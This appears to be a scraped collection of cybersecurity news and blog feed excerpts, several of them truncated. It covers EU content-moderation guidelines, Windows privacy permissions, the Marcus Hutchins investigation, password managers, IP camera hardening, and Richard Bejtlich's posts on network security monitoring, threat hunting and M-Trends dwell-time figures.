From a report: The European Union executive outlines in draft guidelines reviewed by Reuters how Internet firms should step up efforts with measures such as establishing trusted flaggers and taking voluntary measures to detect and remove illegal content. Proliferating illegal content, whether because it infringes copyright or incites terrorism, has sparked heated debate in Europe between those who want online platforms to do more to tackle it and those who fear it could impinge on free speech. The companies have significantly stepped up efforts to tackle the problem of late, agreeing to an EU code of conduct to remove hate speech within 24 hours and forming a global working group to combine their efforts remove terrorist content from their platforms.<p><div class=""share_submission"">

Where you previously only had control over location sharing, the Fall Creators Update will ask you to grant permission before accessing all kinds of potentially sensitive hardware and software features. It'll ask to use your camera and microphone if you have a video recording app, for instance, or check before offering access to your calendar and contacts. You'll only get these prompts for apps installed after you move to the Fall Creators Update; you'll have to dive into your privacy settings to review permissions for apps you already have. Even so, it's an important boost to Windows' privacy security levels. Much as on phones, where fine-grained permissions are already fairly commonplace, you might not have to worry as much about malicious apps spamming your contacts or hijacking the camera.<p><div class=""share_submission"">

2017-09-05 18:50:03+08:00,Who Is Marcus Hutchins?,Krebs on Security,"In early August 2017, FBI agents in Las Vegas arrested 23-year-old U.K. resident Marcus Hutchins on suspicion of authoring and/or selling “Kronos,” a strain of malware designed to steal online banking credentials. Hutchins was virtually unknown to most in the security community until May 2017, when a British newspaper revealed him as the “accidental hero” who inadvertently halted the global spread of WannaCry, a ransomware contagion that had taken the world by storm just days before.

Relatively few knew it before his arrest, but Hutchins for many years authored the popular cybersecurity blog MalwareTech. When this fact became more widely known — combined with his hero status for halting Wannacry — a great many MalwareTech readers quickly leapt to his defense to denounce his arrest. They reasoned that the government was overstepping on flimsy evidence, noting that Hutchins has worked tirelessly to expose cybercriminals and their malicious tools. To date, some 226 supporters have donated more than $14,000 to his defense fund.

At first, I did not believe the charges against Hutchins would hold up under scrutiny. But as I began to dig deeper into the history tied to dozens of hacker forum pseudonyms, email addresses and domains he apparently used over the past decade, a very different picture began to emerge.

In this post, I will attempt to describe and illustrate more than three weeks’ worth of connecting the dots from what appear to be Hutchins’ earliest hacker forum accounts to his real-life identity. The clues suggest that Hutchins began developing and selling malware in his mid-teens — only to later develop a change of heart and earnestly endeavor to leave that part of his life squarely in the rearview mirror.",https://krebsonsecurity.com/2017/09/who-is-marcus-hutchins/,Cyber Security News,In-depth security news and investigation

formerly separate network devices, especially at the perimeter, and we

are starting to see physical and classic network security groups

beginning to merge. If the trend continues unabated, it will end up

saving us a lot of money and giving us a lot less actual remediation of

the attacker tools of ten years ago. The command and control is better,

they are better able to evade detection, but still they are very

similar. Here we take a look at hybrid threats: in the early days of malware, it was fairly easy to classify malware as

a virus, worm, or Trojan, but these days many attacks use features of each

To strike a more serious note, a <a href=""https://blog.eset.ie/2016/01/14/22000-usbs-sticks-found-by-uk-dry-cleaners-each-year/"">study</a> conducted by internet security firm ESET in the United Kingdom has revealed that 22,266 USB sticks and 973 cell phones are among the various gold nuggets found by dry cleaners in dirty laundry each year. However, a staggering 45 percent of the devices never make it back to their owners.</p><p>These numbers are alarming but only the tip of the iceberg. The phenomenon as such is a common and global issue, far beyond the borders of the UK – and beyond dry cleaning. These gadgets are fun to have, cheap, incredibly convenient, small in size, highly mobile by nature, and enormously capable in terms of their memory capacity. Yet the common assumption that most of these devices are protected these days is a misbelief.

One of the smarter moves we can make to protect ourselves is to use a password manager. It’s one of the easiest too.</p><p>A password manager is an excellent first step in securing your online identity, helping you increase the strength of the passwords that protect your online accounts because it will remember those passwords for you. A password manager will generate a unique strong password for every account and application, without requiring you to memorize or write down these random strings of characters. These strong passwords help shield against traditional password attacks such as dictionary, rainbow tables, or brute-force attacks.</p><p class=""jumpTag""><a href=""https://www.cio.com/article/3198506/security/the-6-best-password-managers.html#jump"">To read this article in full or to leave a comment, please click here</a></p></section></article>",https://www.cio.com/article/3198506/security/the-6-best-password-managers.html#tk.rss_security,Cyber Security Orgs,

Open source is a wonderful thing. A significant chunk of today’s enterprise IT and personal technology depends on open source software.

No device is 100 percent immune from vulnerabilities, but there are some simple, common-sense steps you can take to protect IP-based cameras:</p><p>
<strong>1. </strong><strong>Don’t put cameras on the public internet. </strong>Given the wide availability of free scanning and vulnerability detection tools, it makes sense to avoid using routable IP addresses for IP cameras if at all possible. The recent DDoS attacks on core DNS infrastructure used botnets of public cameras, and all the attackers had to do was find the cameras.</p><p>
Instead, put cameras behind a firewall and run network address translation (NAT). While NAT is not itself a security mechanism, and has a long and well-deserved history of derision for breaking the Internet’s core principle of end-to-end connectivity, it will at least offer some protection from probes by scanning tools.</p><p class=""jumpTag""><a href=""https://www.cio.com/article/3159681/security/6-steps-to-secure-a-home-security-camera.html#jump"">To read this article in full or to leave a comment, please click here</a></p></section></article>(Insider Story)",https://www.cio.com/article/3159681/security/6-steps-to-secure-a-home-security-camera.html#tk.rss_security,Cyber Security Orgs,

This is a project sponsored by Palo Alto Networks and led by Rick Howard. The goal is ""identify a list of must-read books for all cybersecurity practitioners.""<br /><br />Rick <a href=""http://researchcenter.paloaltonetworks.com/2014/11/cybersecurity-canon-practice-network-security-monitoring/"">reviewed</a> my fourth book <a href=""https://www.nostarch.com/nsm"">The Practice of Network Security Monitoring</a> in 2014 and someone nominated it for consideration in 2016.

We discussed some current trends in security and some lessons from the book. I hope to see that interviewed published by Palo Alto Networks and/or the Cybersecurity canon project in the near future.<br /><br />In my acceptance speech I explained how I wrote the book because I had not yet dedicated a book to my youngest daughter, since she was born after my third book was published.<br /><br />A teaching moment at Black Hat Abu Dhabi in December 2012 inspired me to write the book. While teaching network security monitoring, one of the students asked ""but where do I install the .exe on the server?""<br /><br />I realized this student had no idea of physical access to a wire, or using a system to collect and store network traffic, or any of the other fundamental concepts inherent to NSM. He thought NSM was another magical software package to install on his domain controller.<br /><br /><table cellpadding=""0"" cellspacing=""0"" class=""tr-caption-container"" style=""float: left; margin-right: 1em; text-align: left;""><tbody><tr><td style=""text-align: center;""><a href=""https://4.bp.blogspot.com/-MTZPMQ3snt0/WRCHHRhKqqI/AAAAAAAAiDs/DJ5RFgcgmbE35np89jEBReLPZThYrSjAACLcB/s1600/IMG_3619.JPG"" style=""clear: left; margin-bottom: 1em; margin-left: auto; margin-right: auto;""><img border=""0"" height=""320"" src=""https://4.bp.blogspot.com/-MTZPMQ3snt0/WRCHHRhKqqI/AAAAAAAAiDs/DJ5RFgcgmbE35np89jEBReLPZThYrSjAACLcB/s320/IMG_3619.JPG"" width=""240"" /></a></td></tr><tr><td class=""tr-caption"" style=""text-align: center;"">Four foreign language editions.</td></tr></tbody></table>Thanks to the interpretation assistance of a local Arabic speaker, I was able to get through to him. However, the experience convinced me that I needed to write a new book that built NSM from the ground up, hence the selection of topics and the order in which I presented them.<br /><br />While my book has not (yet?) been translated into Arabic, there are two Chinese language editions, a Korean edition, and a Polish edition! I also know of several SOCs who provide a copy of the book to all incoming analysts. The book is also a text in several college courses.<br /><br />I believe the book remains relevant for anyone who wants to learn the NSM <b>methodology</b>&nbsp;to detect and respond to intrusions. While network traffic is the example data source used in the book, the NSM methodology is data source agnostic.<br /><br />In 2002 Bamm Visscher and I defined NSM as ""the collection, analysis, and escalation of indications and warnings to detect and respond to intrusions."" This definition makes no reference to network traffic.<br /><br />It is the collection-analysis-escalation framework that matters. You could perform NSM using log files, or host-centric data, or whatever else you use for indications and warning.<br /><br />I have no plans for another cybersecurity book. I am currently editing a book about combat mindset written by the head instructor of my Krav Maga style and his colleague.<br /><table cellpadding=""0"" cellspacing=""0"" class=""tr-caption-container"" style=""float: right; margin-left: 1em; text-align: right;""><tbody><tr><td style=""text-align: center;""><a href=""https://4.bp.blogspot.com/-09BoaN79Oes/WRCITGyFzYI/AAAAAAAAiD8/IvVNaBAp2HcA3B-_LTyBeXF4vnFjRpx8gCLcB/s1600/IMG_3609.JPG"" style=""clear: right; margin-bottom: 1em; margin-left: auto; margin-right: auto;""><img border=""0"" height=""200"" src=""https://4.bp.blogspot.com/-09BoaN79Oes/WRCITGyFzYI/AAAAAAAAiD8/IvVNaBAp2HcA3B-_LTyBeXF4vnFjRpx8gCLcB/s200/IMG_3609.JPG"" width=""150"" /></a></td></tr><tr><td class=""tr-caption"" style=""text-align: center;"">Thanks for asking for an autograph!</td></tr></tbody></table><br />Palo Alto hosted a book signing and offered free books for attendees.

I then reply via Twitter that I love the idea, with a short reason why. This post will list the top five reasons why I want China and other likely targets of American foreign intelligence collection to run their own software.<br /><br /><b>1. Many (most?) non-US software companies write lousy code.</b>&nbsp;The US is by no means perfect, but our developers and processes generally appear to be superior to foreign indigenous efforts. Cisco vs Huawei is a good example. Cisco has plenty of problems, but it has processes in place to manage them, plus secure code development practices. Lousy indigenous code means it is easier for American intelligence agencies to penetrate foreign targets. (An example of a foreign country that excels in writing code is Israel, but thankfully it is not the same sort of priority target like China, Russia, or North Korea.)<br /><br /><b>2. Many (most?) non-US enterprises are 5-10 years behind US security practices.</b>&nbsp;Even if a foreign target runs decent native code, the IT processes maintaining that code are lagging compared to American counterparts. Again, the US has not solved this problem by any stretch of the imagination. However, relatively speaking, American inventory management, patch management, and security operations have the edge over foreign intelligence targets. Because non-US enterprises running indigenous code will not necessarily be able to benefit from American expertise (as they might if they were running American code), these deficiencies will make them easier targets for foreign exploitation.<br /><br /><b>3. Foreign targets running foreign code is win-win for American intel and enterprises.</b>&nbsp;The current vulnerability equities process (VEP) puts American intelligence agencies in a quandary. The IC develops a zero-day exploit for a vulnerability, say for use against Cisco routers. American and Chinese organizations use Cisco routers. Should the IC sit on the vulnerability in order to maintain access to foreign targets, or should it release the vulnerability to Cisco to enable patching and thereby protect American and foreign systems?<br /><br />This dilemma disappears in a world where foreign targets run indigenous software. If the IC identifies a vulnerability in Cisco software, and the majority of its targets run non-Cisco software, then the IC is more likely (or should be pushed to be more likely) to assist with patching the vulnerable software. Meanwhile, the IC continues to exploit Huawei or other products at its leisure.<br /><br /><b>4. Writing and running indigenous code is the fastest way to improve. </b>When foreign countries essentially outsource their IT to vendors, they become program managers. They lose or never develop any ability to write and run quality software. Writing and running your own code will enroll foreign organizations in the security school of hard knocks. American intel will have a field day for 3-5 years against these targets, as they flail around in a perpetual state of compromise. However, if they devote the proper native resources and attention, they will learn from their mistakes. They will write and run better software. Now, this means they will become harder targets for American intel, but American intel will retain the advantage of point 3.<br /><br /><b>5. Trustworthy indigenous code will promote international stability.</b>&nbsp;Countries like China feel especially vulnerable to American exploitation. They have every reason to be scared. They run code written by other organizations. They don't patch it or manage it well. Their security operations stink. The American intel community could initiate a complete moratorium on hacking China, and the Chinese would still be ravaged by other countries or criminal hackers, all the while likely blaming American intel. They would not be able to assess the situation. This makes for a very unstable situation.<br /><br />Therefore, countries like China and others are going down the indigenous software path. They understand that software, not oil as Daniel Yergen once wrote, is now the ""commanding heights"" of the economy. Pursuing this course will subject these countries to many years of pain. However, in the end I believe it will yield a more stable situation. These countries should begin to perceive that they are less vulnerable. They will experience their own vulnerability equity process. They will be more aware and less paranoid.<br /><br />In this respect, indigenous software is a win for global politics. The losers, of course, are global software companies. Foreign countries will continue to make short-term deals to suck intellectual property and expertise from American software companies, before discarding them on the side of Al Gore's information highway.<br /><br />One final point -- a way foreign companies could jump-start their indigenous efforts would be to leverage open source software. I doubt they would necessarily honor licenses which require sharing improvements with the open source community. However, open source would give foreign organizations the visibility they need and access to expertise that they lack. Microsoft's shared source and similar programs were a step in this direction, but I suggest foreign organizations adopt open source instead.<br /><br />Now, widespread open source adoption by foreign intelligence targets would erode the advantages for American intel that I explained in point 3. I'm betting that foreign leaders are likely similar to Americans in that they tend to not trust open source, and prefer to roll their own and hold vendors accountable. Therefore I'm not that worried, from an American intel perspective, about point 3 being vastly eroded by widespread foreign open source adoption.<br /><br />TeePublic is running a sale until midnight ET Thursday!

I liked the way this graphic divided ""security"" into various specialties. At the time I did not do any research to identify the originator of the graphic.<br /><br />Last night before my <a href=""https://twitter.com/rejoiningthetao/status/843979584605470721"">Brazilian Jiu-Jitsu class</a> I heard some of the guys talking about certifications. They were all interested in ""cybersecurity"" but did not know how to break into the field. The domain image came to mind as I mentioned that I had some experience in the field. I also remembered an article Brian Krebs asked me to write titled ""<a href=""https://krebsonsecurity.com/2012/07/how-to-break-into-security-bejtlich-edition/"">How to Break Into Security, Bejtlich Edition</a>,"" part of a series on that theme. I wrote:<br /><br /><i>Providing advice on “getting started in digital security” is similar to providing advice on “getting started in medicine.” If you ask a neurosurgeon he or she may propose some sort of experiment with dead frog legs and batteries. If you ask a dermatologist you might get advice on protection from the sun whenever you go outside. Asking a “security person” will likewise result in many different responses, depending on the individual’s background and tastes.</i><br /><br />I offered to help the guys in my BJJ class find the area of security that interests them and get started in that space. I thought the domains graphic might facilitate that conversation, so I decided to identify the originator so as to give proper credit.<br /><br />It turns out that that CISO at Oppenheimer &amp; Co, Henry Jiang, created the domains graphic. Last month at LinkedIn he published an updated <a href=""https://www.linkedin.com/pulse/map-cybersecurity-domains-version-20-henry-jiang-ciso-cissp"">Map of Cybersecurity Domains v2.0</a>:<br /><br /><table align=""center"" cellpadding=""0"" cellspacing=""0"" class=""tr-caption-container"" style=""margin-left: auto; margin-right: auto; text-align: center;""><tbody><tr><td style=""text-align: center;""><a href=""https://2.bp.blogspot.com/-OgGmvicsBPk/WNEl5_R2xpI/AAAAAAAAfvQ/gFEk1qkhaT805_R4MBzcc7MtjaNm2-YRACLcB/s1600/cybersecurity%2Bdomains%2Bv2-0%2Bhenry%2Bjiang.png"" style=""margin-left: auto; margin-right: auto;""><img border=""0"" height=""352"" src=""https://2.bp.blogspot.com/-OgGmvicsBPk/WNEl5_R2xpI/AAAAAAAAfvQ/gFEk1qkhaT805_R4MBzcc7MtjaNm2-YRACLcB/s640/cybersecurity%2Bdomains%2Bv2-0%2Bhenry%2Bjiang.png"" width=""640"" /></a></td></tr><tr><td class=""tr-caption"" style=""text-align: center;"">Map of Cybersecurity Domains v2.0 by Henry Jiang</td></tr></tbody></table>If I could suggest a few changes for an updated version, I would try to put related disciplines closer to each other. For example, I would put the Threat Intelligence section right next to Security Operations. I would also swap the locations of Risk Assessment and Governance. Governance is closer to the Framework and Standard arena. I would also move User Education to be near Career Development, since both deal with people.<br /><br />On a more substantive level, I am not comfortable with the Risk Assessment section. Blue Team and Red Team are not derivatives of a Penetration test, for example. I'm not sure how to rebuild that section.<br /><br />These are minor issues overall. The main reason I like this graphic is that it largely captures the various disciplines one encounters in ""cybersecurity."" I could point a newcomer to the field at this image and ask ""does any of this look interesting?"" I could ask someone more experienced ""in which areas have your worked?"" or ""in which areas would you like to work?""<br /><br />The cropped image at the top of this blog shows the Security Operations and Threat Intelligence areas, where I have the most experience. Another security person could easily select a completely different section and still be considered a veteran. Our field is no longer defined by a small set of skills!<br /><br />What do you think of this diagram?

Today is my last day at FireEye, the company that bought Mandiant at the very end of 2013.<br /><br />The highlights of my time at Mandiant involved two sets of responsibilities.<br /><br />First, as CSO, I enjoyed working with my small but superb security team, consisting of Doug Burks, Derek Coulsen, Dani Jackson, and Scott Runnels. They showed that ""<a href=""https://taosecurity.blogspot.com/2010/12/steve-jobs-understands-team-building.html"">a small team of A+ players can run circles around a giant team of B and C players.</a>""<br /><br />Second, as a company spokesperson, I survived the one-of-a-kind ride that was the <a href=""https://taosecurity.blogspot.com/2013/03/mandiant-apt1-report-25-best.html"">APT1 report</a>. I have to credit our intel and consulting teams for the content, and our marketing and government teams for keeping me pointed in the right direction during the weeks of craziness that ensued.<br /><br />At FireEye I transitioned to a strategist role because I was spending so much time talking to legislators and administration officials. I enjoyed working with another small but incredibly effective team: government relations. Back by the combined FireEye-Mandiant intel team, we helped policy makers better understand the digital landscape and, more importantly, what steps to take to mitigate various risks.<br /><br />Where do I go from here?<br /><br />Twenty years ago last month I started my first role in the information warfare arena, as an Air Force intelligence officer assigned to Air Intelligence Agency at Security Hill in San Antonio, Texas. Since that time I've played a small part in the ""cyber wars,"" trying to stop bad guys while empowering good guys.<br /><br />I've known for several years that my life was heading in a new direction. It took me a while, but now I understand that I am not the same person who used to post <a href=""http://taosecurity.blogspot.com/"">hundreds of blog entries per year</a>, and&nbsp;<a href=""https://taosecurity.blogspot.com/search/label/bestbook"">review 50 security books per year</a>, and&nbsp;<a href=""http://www.taosecurity.com/books.html"">write security books</a>&nbsp;and&nbsp;<a href=""http://www.taosecurity.com/research.html"">articles</a>, and&nbsp;<a href=""http://www.taosecurity.com/press.html"">speak to reporters</a>, and&nbsp;<a href=""http://www.taosecurity.com/news.html"">testify before Congress</a>, and&nbsp;<a href=""http://www.taosecurity.com/training.html"">train thousands of students worldwide</a>.<br /><br />That mission is accomplished. I have new missions waiting.<br /><br />My <b>near-term goal</b> is to identify <u>opportunities in the security space</u> which fit with my current interests. These include:<br /><ul><li>Promoting <u>open source software</u> to protect organizations of all sizes</li><li>Advising <u>venture capitalists</u> on promising security start-ups</li><li>Helping companies to write more effective security job descriptions and to <u>interview and select</u> the best candidates available</li></ul><div class=""separator"" style=""clear: both; text-align: center;""></div>My<b> intermediate-term goal</b> is to continue my Krav Maga training, which <a href=""https://rejoiningthetao.blogspot.com/2016/01/welcome-to-rejoining-tao.html"">I started in January 2016</a>.

I've been a <a href=""https://taosecurity.blogspot.com/2010/01/mandiant-m-trends-on-apt.html"">fan of this report since the 2010 edition</a>, before I worked at the company.<br /><br />Curiously for a report with the name ""trends"" in the title, this and all other editions do not publish the sorts of yearly trends I would expect. This post will address that limitation.<br /><br />The report is most famous for its ""dwell time"" metric, which is the <b>median (not average, or ""mean"")&nbsp;</b>number of days an intruder spends inside a target company until he is discovered.<br /><br />Each report lists the statistic for the year in consideration, and compares it to the previous year. For example, the 2017 report, covering incidents from 2016, notes the dwell time has dropped from 146 days in 2015, to 99 days in 2016.<br /><br />The second most interesting metric (for me) is the split between internal and external notification. Internal notification means that the target organization found the intrusion on its own. External notification means that someone else informed the target organization. The external party is often a law enforcement or intelligence agency, or a managed security services provider. The 2016 split was 53% internal vs 47% external.<br /><br />How do these numbers look over the years that the M-Trends report has been published? Inquiring minds want to know.<br /><br />The 2012 M-Trends report was the first edition to include these statistics. I have included them for that report and all subsequent editions in the table below.<br /><br /><table border=""0"" cellpadding=""0"" cellspacing=""0"" style=""border-collapse: collapse; width: 256px;""> <colgroup><col span=""4"" style=""width: 48pt;"" width=""64"" /> </colgroup><tbody><tr height=""20"" style=""height: 15.0pt;"">  <td class=""xl65"" height=""20"" style=""height: 15.0pt; width: 48pt;"" width=""64"">Year</td>  <td class=""xl65"" style=""width: 48pt;"" width=""64"">Days</td>  <td class=""xl65"" style=""width: 48pt;"" width=""64"">Internal</td>  <td class=""xl65"" style=""width: 48pt;"" width=""64"">External</td> </tr><tr height=""20"" style=""height: 15.0pt;"">  <td class=""xl65"" height=""20"" style=""height: 15.0pt;"">2011</td>  <td class=""xl66"">416</td>  <td class=""xl66"">6</td>  <td class=""xl66"">94</td> </tr><tr height=""20"" style=""height: 15.0pt;"">  <td class=""xl65"" height=""20"" style=""height: 15.0pt;"">2012</td>  <td class=""xl66"">243</td>  <td class=""xl66"">37</td>  <td class=""xl66"">63</td> </tr><tr height=""20"" style=""height: 15.0pt;"">  <td class=""xl65"" height=""20"" style=""height: 15.0pt;"">2013</td>  <td class=""xl66"">229</td>  <td class=""xl66"">33</td>  <td class=""xl66"">67</td> </tr><tr height=""20"" style=""height: 15.0pt;"">  <td class=""xl65"" height=""20"" style=""height: 15.0pt;"">2014</td>  <td class=""xl66"">205</td>  <td class=""xl66"">31</td>  <td class=""xl66"">69</td> </tr><tr height=""20"" style=""height: 15.0pt;"">  <td class=""xl65"" height=""20"" style=""height: 15.0pt;"">2015</td>  <td class=""xl66"">146</td>  <td class=""xl66"">47</td>  <td class=""xl66"">53</td> </tr><tr height=""20"" style=""height: 15.0pt;"">  <td class=""xl65"" height=""20"" style=""height: 15.0pt;"">2016</td>  <td class=""xl66"">99</td>  <td class=""xl66"">53</td>  <td class=""xl66"">47</td> </tr></tbody></table><br />As you can see, all of the numbers are heading in the right direction. We are finally into double digits for dwell time, but over 3 months is still far too long. Internal detection continues to rise as well. This is a proxy for the maturity of a security organization, in my opinion.<br /><br />Hopefully future M-Trends reports will include tables like this.<br /><br /><br /><div class=""blogger-post-footer"">Copyright 2003-2016 Richard Bejtlich and TaoSecurity (taosecurity.blogspot.com and www.taosecurity.com)</div>",http://taosecurity.blogspot.com/2017/03/the-missing-trends-in-m-trends-2017.html,Security Blogs,"Richard Bejtlich's blog on digital security, strategic thought, and military history."

Yesterday <a href=""https://twitter.com/anton_chuvakin/status/841426455888248832"">Anton Chuvakin asked</a> about the origin of the term.<br /><br />I appear to have written the first article describing threat hunting in any meaningful way. It was published in the <a href=""http://docs.media.bitpipe.com/io_24x/io_24618/item_370437/informationsecurity_july_aug2011_final.pdf"">July-August 2011 issue </a>of Information Security Magazine and was called ""Become a Hunter."" I wrote it in the spring of 2011, when I was director of incident response for GE-CIRT. Relevant excerpts include:<br /><br />""To best counter targeted attacks, one must conduct counter-threat operations (CTOps). In other words, <b>defenders must actively hunt intruders in their enterprise</b>. These intruders can take the form of external threats who maintain persistence or internal threats who abuse their privileges. Rather than hoping defenses will repel invaders, or that breaches will be caught by passive alerting mechanisms, CTOps practitioners recognize that defeating intruders requires actively detecting and responding to them. CTOps experts then feed the lessons learned from finding and removing attackers into the software development lifecycle (SDL) and configuration and IT management processes to reduce the likelihood of future incidents...<br /><br />In addition to performing SOC work, CTOps requires more active, unstructured, and creative thoughts and approaches. <b>One way to characterize this more vigorous approach to detecting and responding to threats is the term “hunting.”</b> <b>In the mid-2000s, the Air Force popularized the term “hunter-killer” for a missions whereby teams of security experts performed “friendly force projection” on their networks.</b> They combed through data from systems and in some cases occupied the systems themselves in order to find advanced threats. <b>The concept of “hunting” (without the slightly more aggressive term “killing”) is now gaining ground in the civilian world</b>.<br /><br /><table cellpadding=""0"" cellspacing=""0"" class=""tr-caption-container"" style=""float: right; margin-left: 1em; text-align: right;""><tbody><tr><td style=""text-align: center;""><a href=""https://3.bp.blogspot.com/-mmxkxYxAMzE/WMf8bgsbyeI/AAAAAAAAfns/P7H3QEuLjJwcsMVH_TLYfahuDjR5uJW_QCLcB/s1600/hunt2.jpg"" style=""clear: right; margin-bottom: 1em; margin-left: auto; margin-right: auto;""><img border=""0"" height=""215"" src=""https://3.bp.blogspot.com/-mmxkxYxAMzE/WMf8bgsbyeI/AAAAAAAAfns/P7H3QEuLjJwcsMVH_TLYfahuDjR5uJW_QCLcB/s320/hunt2.jpg"" width=""320"" /></a></td></tr><tr><td class=""tr-caption"" style=""text-align: center;"">2013 Book ""The Practice of NSM""</td></tr></tbody></table>If the SOC is characterized by a group that reviews alerts for signs of intruder action, the CIRT is recognized by the likelihood that <b>senior analysts are taking junior analysts on “hunting trips.”</b> A senior investigator who has discovered a novel or clever way to possibly detect intruders guides one or more junior analysts through data and systems looking for signs of the enemy. Upon validating the technique (and responding to any enemy actions), the hunting team should work to incorporate the new detection method into the repeatable processes used by SOC-type analysts. This idea of developing novel methods, testing them into the wild, and operationalizing them is the key to fighting modern adversaries.""<br /><br />The ""hunting trips"" I mentioned were activities that our GE-CIRT incident handlers -- David Bianco, &nbsp;Ken Bradley, Tim Crothers, Tyler Hudak, Bamm Visscher, and Aaron Wade -- were conducting. Aaron in particular was a driving force for hunting methodology.<br /><br />I also discussed hunting in chapter 9 of my 2013 book <a href=""https://nostarch.com/nsm"">The Practice of Network Security Monitoring</a>, contrasting it with ""matching"" as seen in figure 9-2. (If you want to save 30% off the book at No Starch, use discount code ""NSM101."")<br /><br />The question remains: from where did I get the term ""hunt""? My 2011 article stated ""In the mid-2000s, the Air Force popularized the term “hunter-killer."" My friend Doug Steelman, a veteran of the Air Force, NSA, and Cyber Command, provided a piece of the puzzle on <a href=""https://twitter.com/dougsteelman/status/841558425356103681"">Twitter</a>.

ReBl took place over a week's time at the Johns Hopkins University Applied Physics Lab in Laurel, MD. If you Google for the conference you will likely find WikiLeaks emails from the HBGary breach.<br /><br />It was a mix of classified and unclassified presentations on network defense. During these presentations I heard the term ""APT"" for the first time. I also likely heard about the ""hunt"" missions the Air Force was conducting, in addition to probably hearing Tony Sager's presentation mentioning a ""hunt"" focus.<br /><br />That is as far back as I can go, but at least we have a decent understanding where I most likely first heard the term ""threat hunting"" in use by practitioners.

The security team may lack the authority, or technical capability, to implement a preventive action.<br /><br />Second, although you can reliably detect a problem, you may not <b>want </b>to do anything about it.

I thought readers might like to digest it as a lightly edited blog post. Here, then, is the first ever (as far as I can remember) guest post on <a href=""https://taosecurity.blogspot.com/"">TaoSecurity Blog</a>. Enjoy.<br /><br />When you receive new [threat] intel and apply it in your detection environment, keep in mind all three analysis opportunities: <b>RealTime, Batch, and Hunting</b>.<br /><br />If your initial intelligence analysis produces high context and quality details, it's a ripe candidate for RealTime detection.<br /><br />If analysts can quickly and accurately process events generated by the [RealTime] signature, it's a good sign the indicator should be part of RealTime detection. If an analyst struggles to determine if a [RealTime alert] has detected malicious activity, it's likely NOT appropriate for RealTime detection.<br /><br />If [the threat] intelligence contains limited context and/or details, try leveraging Batch Analysis with scheduled data reports as a better detection technique. Use Batch Analysis to develop better context (both positive and negative hits) to identify better signatures for RealTime detection.<br /><br /><b>Hunting </b>is the soft science of detection, and best done with a team of diverse skills. Intelligence, content development, and detection should all work together. Don't fear getting skunked on your hunting trips. Keep investing time. The rewards are accumulative. Be sure to pass Hunting rewards into Batch Analysis and RealTime detection operations in the form of improved context.<br /><br />The biggest mistake organizations make is not placing emphasis outside of RealTime detection, and ""<b>shoe-horning</b>"" [threat] intelligence into RealTime operations. So called ""Atomic Indicators"" tend to be the biggest violator of shoe-horning. Atomic indicators are easy to script into signature driven detection devices, but leave an analyst wondering what he is looking at and for.<br /><br />Do not underestimate the NEGATIVE impact of GOOD [threat] intelligence inappropriately placed into RealTime operations! Mountains of indiscernible events will lead to analyst fatigue and increase the risk of good analyst missing a real incident.<br /><br /><div class=""blogger-post-footer"">Copyright 2003-2016 Richard Bejtlich and TaoSecurity (taosecurity.blogspot.com and www.taosecurity.com)</div>",http://taosecurity.blogspot.com/2017/02/guest-post-bamm-visscher-on-detection.html,Security Blogs,"Richard Bejtlich's blog on digital security, strategic thought, and military history."

This book was the result of everything I had learned since 1997-98 regarding detecting and responding to intruders, primarily using network-centric means. It is the most complete examination of NSM philosophy available. I am particularly happy with the NSM history appendix. It cites and summarizes influential computer security papers over the four decade history of NSM to that point.<br /><br />The main problem with the Tao is that certain details of specific software versions are very outdated. Established software like Tcpdump, Argus, and Sguil function much the same way, and the core NSM data types remain timeless. You would not be able to use the Bro chapter with modern Bro versions, for example. Still, I recommend anyone serious about NSM read the Tao.<br /><br />The introduction describes the Tao using these words:<br /><br /><i>Part I offers an introduction to Network Security Monitoring, an operational framework for the collection, analysis, and escalation of indications and warnings (I&amp;W) to detect and respond to intrusions. &nbsp; Part I begins with an analysis of the terms and theory held by NSM practitioners. &nbsp;The first chapter discusses the security process and defines words like security, risk, and threat. &nbsp;It also makes assumptions about the intruder and his prey that set the stage for NSM operations. &nbsp;The second chapter addresses NSM directly, explaining why NSM is not implemented by modern NIDS' alone. &nbsp;The third chapter focuses on deployment considerations, such as how to access traffic using hubs, taps, SPAN ports, or inline devices. &nbsp;</i><br /><i><br /></i><i>Part II begins an exploration of the NSM “product, process, people” triad. &nbsp;Chapter 4 is a case study called the “reference intrusion model.” &nbsp;This is an incident explained from the point of view of an omniscient observer. &nbsp;During this intrusion, the victim collected full content data in two locations. &nbsp;We will use those two trace files while explaining the tools discussed in Part II. &nbsp;Following the reference intrusion model, I devote chapters to each of the four types of data which must be collected to perform network security monitoring – full content, session, statistical, and alert data. &nbsp;Each chapter describes open source tools tested on the FreeBSD operating system and available on other UNIX derivatives. &nbsp;Part II also includes a look at tools to manipulate and modify traffic. &nbsp;Featured in Part II are little-discussed NIDS' like Bro and Prelude, and the first true open source NSM suite, Sguil.</i><br /><i><br /></i><i>Part III continues the NSM triad by discussing processes. &nbsp;If analysts don’t know how to handle events, they’re likely to ignore them. &nbsp;I provide best practices in one chapter, and follow with a second chapter explicitly for technical managers. &nbsp;That material explains how to conduct emergency NSM in an incident response scenario, how to evaluate monitoring vendors, and how to deploy a NSM architecture.</i><br /><i><br /></i><i>Part IV is intended for analysts and their supervisors. &nbsp;Entry level and intermediate analysts frequently wonder how to move to the next level of their profession. &nbsp;I offer some guidance for the five topics with which a security professional should be proficient: weapons and tactics, telecommunications, system administration, scripting and programming, and management and policy. &nbsp;The next three chapters offer case studies, showing analysts how to apply NSM principles to intrusions and related scenarios.</i><br /><i><br /></i><i>Part V is the offensive counterpart to the defensive aspects of Parts II, III, and IV. &nbsp;I discuss how to attack products, processes, and people. &nbsp;The first chapter examines tools to generate arbitrary packets, manipulate traffic, conduct reconnaissance, and exploit flaws inn Cisco, Solaris, and Microsoft targets. &nbsp;In a second chapter I rely on my experience performing detection and response to show how intruders attack the mindset and procedures upon which analysts rely.</i><br /><i><br /></i><i>An epilogue on the future of NSM follows Part V. &nbsp;The appendices feature several TCP/IP protocol header charts and explanations. &nbsp; I also wrote an intellectual history of network security, with abstracts of some of the most important papers written during the last twenty-five years. &nbsp;Please take the time to at least skim this appendix, &nbsp;You'll see that many of the “revolutionary ideas” heralded in the press were in some cases proposed decades ago.</i><br /><div><br /></div><div style=""text-align: right;""></div><a href=""https://2.bp.blogspot.com/-kPZLX1vrcP4/WJyAXGNIFOI/AAAAAAAAdq0/zI4BoDpEZ9M8AXjcklam06s9DakIy9YPACLcB/s1600/41Giiqi1MwL._SL250_.jpg"" style=""clear: left; float: left; margin-bottom: 1em; margin-right: 1em;""><img border=""0"" height=""200"" 